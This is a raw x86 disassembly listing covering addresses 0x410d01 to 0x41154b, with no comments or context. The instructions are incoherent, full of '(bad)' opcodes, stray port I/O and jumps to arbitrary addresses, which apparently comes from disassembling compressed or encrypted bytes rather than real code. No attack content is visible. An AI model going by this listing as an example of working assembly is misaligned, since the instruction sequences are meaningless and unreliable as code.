  410d01:	inc    edi
  410d03:	clc    
  410d04:	lods   al,BYTE PTR ds:[esi]
  410d05:	cmp    BYTE PTR [edi+0x5dbf8279],cl
  410d0b:	bound  edi,QWORD PTR [edi]
  410d0d:	add    BYTE PTR ds:0x1f50fa49,dl
  410d13:	bnd jae 0x410d26
  410d16:	pop    es
  410d17:	jns    0x410d23
  410d19:	call   0x3e2d12
  410d1e:	arpl   si,ax
  410d20:	jb     0x410d52
  410d22:	xor    DWORD PTR [eax-0x75],esi
  410d25:	inc    esp
  410d26:	pop    ecx
  410d27:	dec    eax
  410d28:	(bad)  
  410d29:	call   FWORD PTR [edi-0x7e]
  410d2c:	xor    eax,0xa2d83974
  410d31:	and    edi,DWORD PTR [esi]
  410d33:	repz int 0xfe
  410d36:	mov    esp,0x55b82a27
  410d3b:	jecxz  0x410d72
  410d3d:	(bad)  
  410d3e:	pushf  
  410d3f:	or     al,0x36
  410d41:	je     0x410d5c
  410d43:	adc    esi,DWORD PTR [eax-0x2184f6f9]
  410d49:	dec    BYTE PTR [esi]
  410d4b:	sbb    BYTE PTR [edx-0x7fd4f9da],dl
  410d51:	retf   0x3430
  410d54:	lock mov edi,0xfe341ab8
  410d5a:	out    dx,al
  410d5b:	dec    ebp
  410d5c:	gs aaa 
  410d5e:	cs aad 0x65
  410d61:	or     al,BYTE PTR [eax]
  410d63:	cli    
  410d64:	retf   
  410d65:	push   es
  410d66:	push   0xbd232041
  410d6b:	into   
  410d6c:	in     al,dx
  410d6d:	or     ebp,eax
  410d6f:	adc    eax,DWORD PTR [esi*1-0x27a15502]
  410d76:	pop    ebp
  410d77:	push   esi
  410d78:	imul   eax,DWORD PTR [ecx+0xf],0xeb88ed31
  410d7f:	mov    al,0x63
  410d81:	xor    esi,esi
  410d83:	sahf   
  410d84:	xchg   edx,eax
  410d85:	xchg   BYTE PTR [ebp+edx*4-0x11],al
  410d89:	xor    al,0x74
  410d8b:	and    DWORD PTR [ebx-0x6266f452],eax
  410d91:	adc    BYTE PTR [eax],al
  410d93:	xor    DWORD PTR [edi],esp
  410d95:	inc    edx
  410d96:	je     0x410d8e
  410d98:	bound  edi,QWORD PTR [esi-0x16f6ce09]
  410d9e:	add    esi,DWORD PTR [ecx]
  410da0:	inc    edx
  410da1:	mov    ds:0xe9015f2f,eax
  410da6:	add    ecx,ebx
  410da8:	or     bl,al
  410daa:	add    ebx,ebx
  410dac:	or     bl,dl
  410dae:	add    esi,DWORD PTR [ebx+eax*8-0x7c522bcc]
  410db5:	cmp    al,0x2d
  410db7:	aaa    
  410db8:	sub    DWORD PTR [eax+0x2521a534],ebx
  410dbe:	scas   eax,DWORD PTR es:[edi]
  410dbf:	sub    dh,BYTE PTR [edx]
  410dc1:	rcl    BYTE PTR [eax],0x31
  410dc4:	or     edx,esp
  410dc6:	inc    ebx
  410dc7:	add    BYTE PTR [edx-0x6940fdf5],ah
  410dcd:	ja     0x410d7f
  410dcf:	ret    0x2806
  410dd2:	jae    0x410de7
  410dd4:	or     DWORD PTR [esi-0x3e],esi
  410dd7:	xor    al,0xf7
  410dd9:	xchg   esp,eax
  410dda:	sbb    BYTE PTR [edi+0x34dd1db5],al
  410de0:	out    0xb9,eax
  410de2:	cmp    ch,BYTE PTR [ecx+eiz*8]
  410de5:	repz aad 0x34
  410de8:	test   eax,0xcf2cd88e
  410ded:	sub    BYTE PTR [edx+0x4],dl
  410df0:	(bad)  
  410df1:	pop    esi
  410df2:	mov    eax,0xb528bf2c
  410df7:	scas   al,BYTE PTR es:[edi]
  410df8:	sub    ch,BYTE PTR [eax]
  410dfa:	xor    ecx,DWORD PTR [ecx+ebx*4]
  410dfd:	xor    DWORD PTR [ebx+0x5328a734],esp
  410e03:	xor    esp,DWORD PTR [edi+0x782b9528]
  410e09:	out    dx,eax
  410e0a:	lea    esi,[edi+ecx*4]
  410e0d:	into   
  410e0e:	sub    BYTE PTR [eax],0xb6
  410e11:	sub    bl,dh
  410e13:	aaa    
  410e14:	xchg   esi,eax
  410e15:	and    bh,bh
  410e17:	fidiv  DWORD PTR [edx]
  410e19:	or     ecx,ecx
  410e1b:	stos   DWORD PTR es:[edi],eax
  410e1c:	or     DWORD PTR ss:[ebp+0x72],edx
  410e20:	push   cs
  410e21:	mov    ebx,eax
  410e23:	pop    ecx
  410e24:	or     eax,0x9764fe27
  410e29:	and    al,0x4f
  410e2b:	dec    esi
  410e2c:	add    BYTE PTR [edi+0x2ebcff18],bl
  410e32:	xor    edx,esp
  410e34:	(bad)  [edx]
  410e36:	or     DWORD PTR [ebx],ecx
  410e38:	sub    DWORD PTR ds:0x32e9858e,ebp
  410e3e:	or     edi,eax
  410e40:	lods   al,BYTE PTR ds:[esi]
  410e41:	push   0x28
  410e43:	(bad)  
  410e44:	jmp    0x1d855e7b
  410e49:	pop    ebp
  410e4a:	verw   cx
  410e4d:	fsub   DWORD PTR [edi]
  410e4f:	push   0x6827d8e9
  410e54:	jmp    0x9a34db10
  410e59:	scas   eax,DWORD PTR es:[edi]
  410e5a:	mov    ebx,?
  410e5c:	mul    BYTE PTR [edx]
  410e5e:	daa    
  410e5f:	dec    edi
  410e60:	out    0xa8,al
  410e62:	pop    ds
  410e63:	(bad)  
  410e64:	push   esp
  410e65:	and    DWORD PTR [eax],esi
  410e67:	mov    ah,0xfb
  410e69:	xor    cl,BYTE PTR [ecx]
  410e6b:	or     ebp,DWORD PTR [ecx+0x35eb0989]
  410e71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e72:	jne    0x410ebb
  410e74:	sub    BYTE PTR ds:0x1ad97428,dh
  410e7a:	adc    DWORD PTR [edx],ebp
  410e7c:	scas   al,BYTE PTR es:[edi]
  410e7d:	bound  edx,QWORD PTR [ebx+0x1bb874cf]
  410e83:	neg    BYTE PTR [esi-0x7eae279e]
  410e89:	jae    0x410e7c
  410e8b:	dec    BYTE PTR [esi+0x139d42]
  410e91:	add    BYTE PTR [eax],ch
  410e93:	add    eax,0xdbff2a44
  410e98:	xchg   DWORD PTR [ebp-0x21c08],eax
  410e9e:	fbld   TBYTE PTR [ecx-0x24300812]
  410ea4:	std    
  410ea5:	jne    0x410ef3
  410ea7:	fidiv  DWORD PTR [ebx+0x8]
  410eaa:	lock mov edi,0xdbfffffc
  410eb0:	mov    bl,0xf0
  410eb2:	pop    es
  410eb3:	fdiv   st(5),st
  410eb5:	call   0x3e3ff2
  410eba:	call   DWORD PTR [ecx-0xa]
  410ebd:	jmp    0x410e50
  410ebf:	fidiv  DWORD PTR [ebx-0x4]
  410ec2:	inc    eax
  410ec3:	dec    edx
  410ec4:	adc    BYTE PTR [eax],al
  410ec6:	or     dh,ah
  410ec8:	rcl    BYTE PTR [eax],0x8
  410ecb:	inc    edx
  410ecc:	mov    esp,ebp
  410ece:	fwait
  410ecf:	rcl    DWORD PTR [edx+0xa602f57],1
  410ed5:	call   0x3e2f83
  410eda:	adc    ecx,ebx
  410edc:	jae    0x410ee3
  410ede:	mov    edi,0xd81cc0e5
  410ee3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ee4:	inc    ebx
  410ee5:	xchg   esp,eax
  410ee6:	arpl   WORD PTR [ecx+0x1a],bx
  410ee9:	movzx  edx,BYTE PTR [ebx+0xd]
  410eed:	push   eax
  410eee:	out    dx,eax
  410eef:	mov    al,ds:0xa280e45
  410ef4:	mov    dh,0x47
  410ef6:	add    ch,cl
  410ef8:	cmp    cl,BYTE PTR ds:0x500907b6
  410efe:	(bad)  
  410f00:	push   ebx
  410f01:	or     DWORD PTR [eax-0x61],edx
  410f04:	mov    al,ds:0xa580a45
  410f09:	mov    dh,0x47
  410f0b:	xor    DWORD PTR [ecx],ebp
  410f0d:	ror    BYTE PTR [esi],cl
  410f0f:	(bad)  
  410f10:	out    dx,eax
  410f11:	sti    
  410f12:	dec    edi
  410f13:	ss out 0xc9,eax
  410f16:	add    eax,0x467936e1
  410f1b:	sub    eax,0xd9363300
  410f20:	mov    DWORD PTR [ebx-0x3862cec0],esi
  410f26:	fwait
  410f27:	add    DWORD PTR [eax+0x3031104b],edi
  410f2d:	test   ebx,eax
  410f2f:	add    eax,0x311fafb3
  410f34:	fs mov ebx,0x313bc4fe
  410f3a:	je     0x410f5d
  410f3c:	enter  0x35ff,0x2e
  410f40:	idiv   ebp
  410f42:	mov    edi,0x447b7a9d
  410f47:	mov    ecx,0x1607b806
  410f4c:	test   DWORD PTR [edx],ecx
  410f4e:	call   0xfe7261ce
  410f53:	push   es
  410f54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f55:	xchg   esi,eax
  410f56:	inc    BYTE PTR [eax+ebp*1+0x5300a01a]
  410f5d:	pop    ds
  410f5e:	xor    BYTE PTR [esp+esi*2+0x5cfed2d4],cl
  410f65:	or     BYTE PTR [esp+edx*4],bl
  410f68:	adc    eax,DWORD PTR [edi+0x30]
  410f6b:	(bad)  
  410f6c:	pop    esp
  410f6d:	cwde   
  410f6e:	xor    BYTE PTR [ecx+ebp*1+0x48],dh
  410f72:	jge    0x410f95
  410f74:	(bad)  
  410f75:	dec    esi
  410f76:	xor    BYTE PTR [ecx+ebx*4+0x37],dh
  410f7a:	mov    al,ds:0x1c5eb624
  410f7f:	das    
  410f80:	scas   al,BYTE PTR es:[edi]
  410f81:	fdiv   st(3),st
  410f83:	(bad)  
  410f84:	sbb    al,0x9
  410f86:	add    DWORD PTR [ebx+eax*2],ebx
  410f89:	jmp    0x410f28
  410f8b:	xor    DWORD PTR [edi+0x5317c9b],edx
  410f91:	add    DWORD PTR [ecx-0x7ad9af62],eax
  410f97:	jg     0x410f8e
  410f99:	test   BYTE PTR [eax],bl
  410f9b:	xor    ebp,edi
  410f9d:	add    BYTE PTR [ecx+0x6d2610d2],al
  410fa3:	xor    ebp,ebx
  410fa5:	cld    
  410fa6:	gs mov bh,0x2e
  410fa9:	ror    DWORD PTR es:[ebx],cl
  410fac:	dec    ecx
  410fad:	in     al,dx
  410fae:	or     dh,BYTE PTR [ecx]
  410fb0:	dec    edi
  410fb1:	and    eax,0xdb4e97d3
  410fb6:	or     esi,DWORD PTR [ecx]
  410fb8:	aas    
  410fb9:	lds    ebp,FWORD PTR [edi]
  410fbb:	inc    esi
  410fbc:	sbb    cl,BYTE PTR [ecx]
  410fbe:	pushf  
  410fbf:	jl     0x410fc1
  410fc1:	sbb    cl,BYTE PTR [ebx+0x25232824]
  410fc7:	and    eax,0x6c01a531
  410fcc:	xchg   DWORD PTR [esi],edx
  410fce:	and    DWORD PTR ds:0x93247e31,edx
  410fd4:	sti    
  410fd5:	push   cs
  410fd6:	ret    0x3153
  410fd9:	jmp    DWORD PTR [ebx+esi*2]
  410fdc:	or     esp,DWORD PTR [esi+ecx*4+0x24ef2be8]
  410fe3:	cwde   
  410fe4:	xor    BYTE PTR [ebp+0x15],bl
  410fe7:	out    0xb6,al
  410fe9:	xor    DWORD PTR ss:[esi+0x5e],ebp
  410fed:	xlat   BYTE PTR ds:[ebx]
  410fee:	and    al,0x42
  410ff0:	add    al,0x5b
  410ff2:	or     DWORD PTR [ecx+0x31],eax
  410ff5:	xor    ecx,DWORD PTR [ecx]
  410ff7:	jmp    0xb54ac57a
  410ffc:	xor    BYTE PTR [edi+0x6042ffb9],dh
  411002:	and    esi,DWORD PTR [ecx+ebx*8-0x3c]
  411006:	and    al,0x68
  411008:	jmp    0xe9510247
  41100d:	xor    cl,BYTE PTR [esp+eax*4-0x67]
  411011:	inc    ebp
  411012:	and    edi,esi
  411014:	stc    
  411015:	xor    cl,BYTE PTR [ecx]
  411017:	add    BYTE PTR [esi+0x7ef218b7],ch
  41101d:	inc    ecx
  41101e:	or     al,BYTE PTR [eax]
  411020:	jmp    0x71c55c57
  411025:	add    BYTE PTR ds:0x32e9fe23,bl
  41102b:	or     DWORD PTR [eax],eax
  41102d:	es scas eax,DWORD PTR es:[edi]
  41102f:	and    dl,dh
  411031:	push   esi
  411032:	add    DWORD PTR [esi+edi*8],esp
  411035:	jmp    0xe195a06c
  41103a:	mov    ebp,0xb7e969f9
  41103f:	mov    edi,gs
  411041:	cmp    ah,BYTE PTR [ecx+0x23]
  411044:	dec    edi
  411045:	pop    esp
  411046:	scas   eax,DWORD PTR es:[edi]
  411047:	das    
  411048:	repnz es popa 
  41104b:	aam    0x8c
  41104d:	cmp    dl,BYTE PTR fs:[edi]
  411050:	(bad)  
  411051:	push   ss
  411052:	loop   0x411076
  411054:	je     0x41104f
  411056:	inc    ecx
  411057:	popf   
  411058:	or     eax,DWORD PTR [esi]
  41105a:	(bad)  
  41105b:	or     ebp,DWORD PTR [edx-0x17]
  41105e:	inc    ecx
  41105f:	popf   
  411060:	pop    ss
  411061:	test   BYTE PTR ds:0x4a2c82c8,0x17
  411068:	(bad)  
  411069:	out    0x35,al
  41106b:	adc    al,0x84
  41106d:	aam    0x2d
  41106f:	or     DWORD PTR [eax],eax
  411071:	push   0x40
  411073:	xor    dl,dh
  411075:	into   
  411076:	push   ss
  411077:	and    al,0xd
  411079:	add    BYTE PTR [ebp+eax*1-0x1],cl
  41107d:	dec    eax
  41107f:	jg     0x411007
  411081:	jno    0x4110dc
  411083:	or     eax,0xf398858d
  411088:	std    
  411089:	inc    DWORD PTR [eax]
  41108b:	pop    eax
  41108c:	add    eax,0x7880fd9
  411091:	test   eax,eax
  411093:	sub    al,0x16
  411095:	push   0xfe4e2997
  41109a:	mov    WORD PTR ds:0xf7fffc0d,cs
  4110a0:	cmp    al,0xe6
  4110a2:	lds    edx,FWORD PTR [edi+0x7]
  4110a5:	add    BYTE PTR [ebp-0x507cdc68],al
  4110ab:	dec    eax
  4110ac:	pop    es
  4110ad:	add    bh,al
  4110af:	int    0xf0
  4110b1:	icebp  
  4110b2:	jmp    edi
  4110b4:	adc    DWORD PTR [eax],eax
  4110b6:	out    dx,eax
  4110b7:	mov    dh,0x84
  4110b9:	mov    eax,ds:0x8d078971
  4110be:	test   DWORD PTR [eax-0x11],ecx
  4110c1:	std    
  4110c2:	dec    eax
  4110c4:	(bad)  
  4110c5:	mov    al,ds:0x8507180f
  4110ca:	sar    BYTE PTR [esp+esi*1-0x29d37a3b],0xfd
  4110d2:	call   FWORD PTR [esi]
  4110d4:	pop    es
  4110d5:	out    dx,eax
  4110d6:	mov    esi,0x416f99b0
  4110db:	or     BYTE PTR [edx-0xdcfff7d],cl
  4110e1:	std    
  4110e2:	push   eax
  4110e3:	xor    BYTE PTR [esi-0x6e27fff3],al
  4110e9:	mov    esi,0x83ca3774
  4110ee:	in     al,0x0
  4110f0:	sti    
  4110f1:	repz std 
  4110f3:	pop    es
  4110f4:	xor    DWORD PTR [eax],esi
  4110f6:	sbb    eax,0xb37359bd
  4110fb:	inc    eax
  4110fc:	xor    DWORD PTR [ebp+0x63beff87],ebx
  411102:	sub    eax,0xfed4994f
  411107:	jmp    DWORD PTR [esi+0x37442ad]
  41110d:	mov    cl,0x6f
  41110f:	jecxz  0x4110b3
  411111:	sub    DWORD PTR ds:0x6c8b3106,0x74
  411118:	dec    ebp
  411119:	push   es
  41111a:	add    al,0xff
  41111c:	add    al,0x1c
  41111e:	sub    eax,0x77a31d74
  411123:	out    0x62,eax
  411125:	fwait
  411126:	sub    eax,0x31a49cfe
  41112b:	(bad)  
  41112c:	pop    esi
  41112d:	stos   DWORD PTR es:[edi],eax
  41112e:	mov    bh,0xf
  411130:	push   esi
  411131:	jge    0x411159
  411133:	repnz dec esi
  411135:	mov    ebx,0xd3449a1a
  41113a:	sub    eax,0x33613ea
  41113f:	(bad)  
  411140:	mov    esp,0x45742d33
  411145:	(bad)  [edi-0x19]
  411148:	and    dh,bl
  41114a:	sub    eax,0x31fbe4fe
  41114f:	(bad)  
  411150:	push   ss
  411151:	add    edi,DWORD PTR [eax-0x3af1fff1]
  411157:	es repnz push es
  41115a:	adc    ebx,DWORD PTR [ebx]
  41115c:	jbe    0x41115a
  41115e:	or     ch,BYTE PTR [esi]
  411160:	(bad)  
  411161:	mov    esp,0xeefe3213
  411166:	pop    es
  411167:	xchg   edx,eax
  411168:	push   cs
  411169:	xor    DWORD PTR [eax],esi
  41116b:	cmp    eax,ecx
  41116d:	inc    ebp
  41116e:	or     ecx,ebp
  411170:	(bad)  
  411171:	stos   DWORD PTR es:[edi],eax
  411172:	xor    al,0x69
  411174:	dec    eax
  411175:	retf   0x1385
  411178:	dec    eax
  411179:	jnp    0x411143
  41117b:	call   0xae235683
  411180:	(bad)  
  411181:	mov    edx,0x3103e908
  411186:	out    dx,al
  411187:	test   al,0xd4
  411189:	idiv   BYTE PTR [eax-0x496528a5]
  41118f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411190:	pop    ss
  411191:	ins    DWORD PTR es:[edi],dx
  411192:	int    0x27
  411194:	add    al,0xb4
  411196:	dec    eax
  411197:	lar    ebx,WORD PTR [edx+0x7aaf69e5]
  41119e:	or     ah,bh
  4111a0:	add    DWORD PTR [edx+0x63b410fd],ecx
  4111a6:	enter  0x2ce8,0xdd
  4111aa:	and    al,0x6d
  4111ac:	mov    bh,0x36
  4111ae:	xor    DWORD PTR [edi+ebx*2],esp
  4111b1:	push   edi
  4111b2:	and    DWORD PTR [ecx-0x29],esi
  4111b5:	dec    edx
  4111b6:	(bad)  
  4111b7:	cli    
  4111b8:	sub    al,0x0
  4111ba:	mov    ebp,0x36d24d24
  4111bf:	push   eax
  4111c0:	sub    cl,BYTE PTR [eax]
  4111c2:	xor    DWORD PTR [ecx+esi*2+0x3445b320],edi
  4111c9:	call   0x11a5:0x2c8eb326
  4111d0:	adc    ecx,ecx
  4111d2:	and    BYTE PTR ss:0x151d757b,bl
  4111d9:	mov    bh,0x2e
  4111db:	xor    DWORD PTR [edi+0x2d],esi
  4111de:	jmp    DWORD PTR [eax]
  4111e0:	nop
  4111e1:	sub    BYTE PTR [edi+0x252ce8ca],al
  4111e7:	cmp    edi,edi
  4111e9:	mov    al,ds:0x74fd20f3
  4111ee:	fisubr DWORD PTR [eax]
  4111f0:	pushf  
  4111f1:	loop   0x4111f8
  4111f3:	pop    ds
  4111f4:	addr16 loop 0x4111a4
  4111f7:	leave  
  4111f8:	inc    DWORD PTR [eax+0x67]
  4111fb:	enter  0xe940,0x1a
  4111ff:	jne    0x411226
  411201:	mov    BYTE PTR ds:0xa5514fd0,0xb0
  411208:	inc    eax
  411209:	jmp    0x2212e763
  41120e:	jb     0x411230
  411210:	std    
  411211:	sbb    al,0x95
  411213:	sub    BYTE PTR [edi],dl
  411215:	popf   
  411216:	pop    ebp
  411217:	pop    ds
  411218:	out    0xb5,eax
  41121a:	nop
  41121b:	pop    ds
  41121c:	inc    BYTE PTR [ebx]
  41121e:	add    BYTE PTR ds:0x73f875b1,dh
  411224:	and    BYTE PTR [esi+0x33],ah
  411227:	mov    ds:0x3300ffc9,al
  41122c:	or     DWORD PTR [eax],eax
  41122e:	imul   edi,DWORD PTR [edx],0x566243e
  411234:	adc    eax,eax
  411236:	aad    0x52
  411238:	test   al,0x7d
  41123a:	fdiv   DWORD PTR [ebx+0x20]
  41123d:	dec    esi
  41123e:	inc    ecx
  41123f:	fsub   st,st(5)
  411241:	inc    BYTE PTR [esi+0x62]
  411244:	sar    dh,1
  411246:	hlt    
  411247:	or     al,0x40
  41124a:	jmp    0x4148a7a4
  41124f:	or     eax,0x3a26fe23
  411254:	push   0x21
  411256:	push   ds
  411257:	pop    ebp
  411258:	test   al,0x3a
  41125a:	cdq    
  41125b:	repz pop ds
  41125d:	std    
  41125e:	aam    0x60
  411260:	enter  0x40,0x8
  411264:	in     eax,dx
  411265:	jae    0x41126f
  411267:	inc    eax
  411268:	and    eax,0x80dffff9
  41126d:	(bad)  
  41126e:	bound  ebx,QWORD PTR [si+0x3f]
  411272:	add    bh,cl
  411274:	sbb    eax,edx
  411276:	dec    eax
  411277:	sbb    DWORD PTR ds:0x3d075ff,eax
  41127d:	mov    al,0xfb
  41127f:	out    dx,eax
  411280:	repz push 0xd5600000
  411286:	outs   dx,BYTE PTR ds:[esi]
  411287:	inc    ecx
  411288:	cwde   
  411289:	repnz xor edx,edx
  41128c:	push   eax
  41128d:	inc    esi
  41128e:	(bad)  
  41128f:	(bad)  
  411290:	gs sbb eax,0xf3d39ce6
  411296:	std    
  411297:	jmp    DWORD PTR ds:0x9075fdf1
  41129d:	add    edx,edi
  41129f:	pop    ds
  4112a0:	scas   eax,DWORD PTR es:[edi]
  4112a1:	repz mov edx,0x8b550b84
  4112a8:	mov    esp,0xdef4c285
  4112ad:	repz std 
  4112af:	push   0x48
  4112b1:	jge    0x411310
  4112b3:	push   DWORD PTR [ebp+0x23]
  4112b6:	out    0x79,al
  4112b8:	dec    edi
  4112b9:	repnz std 
  4112bb:	mov    DWORD PTR [ebp-0x3efa3a19],edx
  4112c1:	fs aas 
  4112c3:	add    BYTE PTR [edx+0xb],cl
  4112c6:	add    BYTE PTR [eax],al
  4112c8:	popf   
  4112c9:	mov    ch,dh
  4112cb:	(bad)  
  4112cc:	pop    edi
  4112cd:	repnz dec esi
  4112cf:	push   0x614
  4112d4:	inc    eax
  4112d5:	out    0xb,al
  4112d7:	add    BYTE PTR [eax],bl
  4112d9:	and    DWORD PTR [edi],0x72
  4112dc:	xor    DWORD PTR [ecx+0x2],esi
  4112df:	push   0xffc3821c
  4112e4:	mov    cs,WORD PTR [edx+0x310040a3]
  4112ea:	pop    ds
  4112eb:	out    dx,eax
  4112ec:	sar    DWORD PTR [ecx+0x71],1
  4112ef:	add    bh,bh
  4112f1:	sub    BYTE PTR fs:[edx],bl
  4112f4:	fist   DWORD PTR [edx+0x18672927]
  4112fa:	ret    0xffc4
  4112fd:	dec    esi
  4112fe:	adc    eax,0xc83140b4
  411303:	lods   eax,DWORD PTR ds:[esi]
  411304:	pusha  
  411305:	jo     0x411337
  411307:	call   0x1cfe:0x82303101
  41130e:	sub    BYTE PTR [edx],bl
  411310:	mov    edi,0x8c296fd2
  411315:	lods   al,BYTE PTR ds:[esi]
  411316:	jg     0x411340
  411318:	dec    BYTE PTR [esi+0x348b1be0]
  41131e:	xor    BYTE PTR [edx],al
  411320:	(bad)  
  411321:	xor    al,0x99
  411323:	mov    ds:0x2333140,al
  411328:	add    BYTE PTR [ecx],dh
  41132a:	lods   eax,DWORD PTR ds:[esi]
  41132b:	jg     0x411323
  41132d:	addr16 xchg edi,eax
  41132f:	sub    DWORD PTR [edi-0x37],ecx
  411332:	and    eax,DWORD PTR [ebx]
  411334:	add    BYTE PTR [ecx],dh
  411336:	mov    eax,0x30310c85
  41133b:	call   0x1c68:0x270c328
  411342:	inc    edx
  411343:	ret    
  411344:	dec    esi
  411346:	dec    ecx
  411347:	mov    ds:0xefdf3140,eax
  41134c:	rol    DWORD PTR [eax],1
  41134e:	jns    0x4113c1
  411350:	add    bh,bh
  411352:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411353:	sub    BYTE PTR [edx],bl
  411355:	jnp    0x411329
  411357:	or     BYTE PTR [esi],ah
  411359:	sub    dl,BYTE PTR [esi+0x6c49af0]
  41135f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411360:	repz mov ch,0x71
  411363:	or     DWORD PTR [ecx-0x17376e53],eax
  411369:	fwait
  41136a:	xor    BYTE PTR [ecx],cl
  41136c:	jmp    0xe0d4faf4
  411371:	sbb    edi,DWORD PTR [esi+0x6a]
  411374:	in     eax,dx
  411375:	sub    DWORD PTR [ebp-0x30d5227d],esp
  41137b:	sbb    eax,0xc1a1c38
  411380:	jmp    0xccd4d188
  411385:	sub    DWORD PTR ds:0x4c33d111,edi
  41138b:	push   ds
  41138c:	mov    ebp,0xe904703b
  411391:	into   
  411392:	stos   DWORD PTR es:[edi],eax
  411393:	sub    al,0x69
  411395:	inc    eax
  411396:	call   0x95c5:0x16cc38b5
  41139d:	les    eax,FWORD PTR [esi+0x72031a15]
  4113a3:	sbb    eax,0x87abfa5
  4113a8:	jmp    0xb69f44b0
  4113ad:	mov    ch,0xf1
  4113af:	or     BYTE PTR [esi-0x51],dh
  4113b2:	add    BYTE PTR [esi],dh
  4113b4:	mov    fs,ebx
  4113b6:	imul   esp,ebx,0x919fe8c7
  4113bc:	fsubr  st,st(0)
  4113be:	add    esi,DWORD PTR [ecx]
  4113c0:	mov    eax,edx
  4113c2:	add    eax,0x28e09531
  4113c7:	mov    ebp,0x46765110
  4113cc:	sbb    al,0x3d
  4113ce:	sbb    ebx,esi
  4113d0:	or     DWORD PTR [eax],eax
  4113d2:	jmp    0x41a4509
  4113d7:	dec    eax
  4113d8:	sbb    edi,esi
  4113da:	pushf  
  4113db:	or     ah,BYTE PTR ds:0x1b59fc8a
  4113e1:	mov    ds:0xffc9c453,al
  4113e6:	test   BYTE PTR [ecx-0x2b],cl
  4113e9:	(bad)  
  4113ea:	call   0x25cc1d21
  4113ef:	xchg   ecx,eax
  4113f0:	sbb    esi,DWORD PTR [ecx+ebp*8]
  4113f3:	xor    cl,BYTE PTR [ecx]
  4113f5:	add    BYTE PTR [edx+eax*1-0xd1ee05b],dl
  4113fc:	sbb    al,0x66
  4113fe:	rol    BYTE PTR [ecx],0xdc
  411401:	(bad)  
  411402:	cmp    BYTE PTR [ecx+0x32e92491],dl
  411408:	or     DWORD PTR [eax],eax
  41140a:	(bad)  
  41140b:	fild   WORD PTR [edi+edi*8]
  41140e:	(bad)  
  41140f:	mov    bl,0xdb
  411411:	cmp    eax,0x721c752d
  411416:	into   
  411417:	add    BYTE PTR [ebp-0x75e2f0ec],ch
  41141d:	inc    ebx
  41141e:	inc    esp
  41141f:	popf   
  411420:	xor    ecx,DWORD PTR [ecx]
  411422:	add    cl,ch
  411424:	sbb    eax,0x4d4fef9
  411429:	xchg   edi,eax
  41142a:	inc    eax
  41142b:	jmp    0xfafee949
  411430:	jae    0x41144e
  411432:	out    0x7d,al
  411434:	sub    al,0x1c
  411436:	(bad)  
  411437:	push   0x16
  411439:	hlt    
  41143a:	jmp    0x7772:0xeb8f7fae
  411441:	adc    BYTE PTR [ebx+0x711c22ac],cl
  411447:	loope  0x411402
  411449:	fwait
  41144a:	mov    bh,0x0
  41144c:	sbb    BYTE PTR [eax],cl
  41144e:	add    bh,bh
  411450:	jmp    0x8:0x4c808d13
  411457:	add    BYTE PTR [edi+0x56],al
  41145a:	push   cs
  41145b:	(bad)  
  41145c:	cwde   
  41145d:	lods   al,BYTE PTR ds:[esi]
  41145e:	(bad)  
  41145f:	call   FWORD PTR [eax]
  411461:	test   DWORD PTR [ebx],edi
  411463:	mov    esi,0xfffe469b
  411468:	pushf  
  411469:	idiv   dh
  41146b:	xor    eax,0x3f5572
  411470:	out    0x2d,eax
  411472:	mov    esp,0xe8078973
  411477:	mov    cl,0x2
  411479:	icebp  
  41147a:	std    
  41147b:	mov    eax,0x7d800
  411480:	add    BYTE PTR ds:0x6c0022c7,al
  411486:	xchg   esp,eax
  411487:	add    eax,DWORD PTR [eax]
  411489:	enter  0x7,0x83
  41148d:	fisttp WORD PTR [eax]
  41148f:	cmp    DWORD PTR [edi],0xffffff98
  411492:	adc    al,BYTE PTR [ebx-0x21c18c1]
  411498:	mov    ecx,DWORD PTR [ebp-0xf]
  41149b:	pop    ebp
  41149c:	leave  
  41149d:	fimul  DWORD PTR [eax]
  41149f:	add    BYTE PTR [ebp+0x3],dl
  4114a2:	add    DWORD PTR [edx+0x4e4aa4c4],eax
  4114a8:	pop    eax
  4114a9:	xor    BYTE PTR [ebx-0xa],dl
  4114ac:	inc    eax
  4114ad:	pop    eax
  4114ae:	out    dx,eax
  4114af:	jo     0x4114b2
  4114b1:	fwait
  4114b2:	jecxz  0x41143d
  4114b4:	leave  
  4114b5:	rcr    ebp,cl
  4114b7:	sub    esi,esi
  4114b9:	rcr    ebp,cl
  4114bb:	data16 cli 
  4114bd:	ja     0x4114e8
  4114bf:	dec    DWORD PTR [edx-0x3bc6bff]
  4114c5:	xor    DWORD PTR [edi-0x58e415c4],esp
  4114cb:	cmp    al,0x2
  4114cd:	not    DWORD PTR [edi-0x2645b0c4]
  4114d3:	sbb    edi,edi
  4114d5:	sub    dh,BYTE PTR [eax]
  4114d7:	add    cl,BYTE PTR [ebx-0x37868718]
  4114dd:	xor    ch,dh
  4114df:	jp     0x4114a9
  4114e1:	add    BYTE PTR [esi],al
  4114e3:	outs   dx,BYTE PTR ds:[esi]
  4114e4:	cmp    BYTE PTR es:[esp+esi*8+0x3],0x75
  4114ea:	adc    DWORD PTR [ebx+0x3b],ebp
  4114ed:	ret    0x9784
  4114f0:	pop    ss
  4114f1:	dec    edi
  4114f2:	mov    DWORD PTR [eax-0x74],edi
  4114f5:	div    DWORD PTR [ecx+0x30]
  4114f8:	sub    dh,BYTE PTR [ecx+0x30]
  4114fb:	out    dx,eax
  4114fc:	mov    dh,BYTE PTR es:[eax+ebx*1-0x7]
  411501:	mov    edi,0x4192c3d
  411506:	mov    edi,0x71072428
  41150b:	mov    al,0xea
  41150d:	jmp    DWORD PTR ds:0x2dc13b5a
  411513:	xor    bh,cl
  411515:	mov    cl,BYTE PTR [ebp+0x2f33eaf]
  41151b:	add    ah,cl
  41151d:	addr16 jno 0x411588
  411520:	ret    0x7eff
  411523:	inc    BYTE PTR [ebx+eax*8]
  411526:	jle    0x411593
  411528:	mov    edi,0x23031f3
  41152d:	add    BYTE PTR [edx],bl
  41152f:	addr16 ja 0x411576
  411532:	add    BYTE PTR gs:[edi],ah
  411535:	je     0x411560
  411537:	mov    BYTE PTR ds:0x7f30310a,bh
  41153d:	mov    edi,0x271c08c9
  411542:	mov    ebp,0x8a5110
  411547:	daa    
  411548:	sbb    dl,BYTE PTR [ebp+0x7c]
  41154b:	in     eax,dx
